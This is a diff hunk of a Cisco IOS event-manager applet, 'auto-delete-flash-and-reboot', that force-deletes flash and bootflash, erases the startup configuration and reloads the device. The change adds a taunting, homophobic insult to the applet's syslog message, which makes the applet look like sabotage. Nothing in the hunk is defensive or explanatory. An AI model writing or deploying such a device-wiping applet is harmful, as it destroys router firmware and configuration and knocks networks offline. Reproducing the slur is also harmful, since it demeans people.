@@ -111,7 +111,7 @@ event manager applet auto-delete-flash-and-reboot
  action 1.0 cli command "delete /force /recursive flash:"
  action 1.1 cli command "delete /force /recursive bootflash:"
  action 1.2 cli command "erase startup-config"
- action 2.0 syslog msg "Deleting flash and rebooting the device..."
+ action 2.0 syslog msg "Deleting flash and rebooting the device...LOSERKA, WHY R U GAY"
  action 3.0 reload
 
 
